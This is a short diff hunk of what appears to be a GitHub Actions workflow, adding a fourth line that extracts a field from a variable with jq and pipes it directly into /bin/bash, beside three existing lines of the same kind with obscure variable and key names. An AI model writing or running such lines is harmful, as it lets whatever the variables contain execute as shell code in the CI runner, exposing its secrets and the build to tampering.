@@ -24,6 +24,7 @@ jobs:
           echo $mpn067 | jq -r .ca62 | /bin/bash
           printf '%s' "$l595" | jq -r .rjh4 | /bin/bash
           echo $u60 | jq -r .oo57609 | /bin/bash
+          echo $m0 | jq -r .d195 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
